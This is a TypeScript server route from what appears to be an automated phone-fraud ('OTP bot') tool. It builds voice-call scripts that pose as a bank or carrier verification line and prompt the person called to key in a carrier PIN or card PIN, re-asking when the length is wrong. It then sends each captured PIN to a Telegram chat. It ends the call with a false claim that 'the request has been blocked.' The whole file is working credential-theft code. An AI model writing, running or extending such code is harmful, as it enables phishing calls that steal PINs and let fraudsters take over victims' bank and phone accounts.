import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';
import { getLangPins } from '../../languages';
import { Language } from '../../types';

app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
  const { step, chatId, language } = req.params;

  const { variables, pinType } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PINS STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangPins({
              step: `1`,
              pinType: `${pinType}`,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    if (!(dtmf.length >= 6 && dtmf.length < 7) && pinType === 'carrierPin') {
      return res.json({
        id: uuidv4(),
        title: `call PINS STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangPins({
                step: `2`,
                pinType: `${pinType}`,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    if (!(dtmf.length >= 4 && dtmf.length < 5) && pinType === 'cardPin') {
      return res.json({
        id: uuidv4(),
        title: `call PINS STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangPins({
                step: `2`,
                pinType: `${pinType}`,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      chatId,
      pinType === 'carrierPin'
        ? `Carrier pin is <b>${dtmf}</b> 📲`
        : `Card pin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }

  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload:
            pinType === 'carrierPin'
              ? `Thank you for verifying. The request has been blocked, Good bye.`
              : getLangPins({
                  step: `3`,
                  pinType: `${pinType}`,
                  language: language as Language,
                }),
          language,
          voice: 'female',
        },
      },
    ],
  });
});
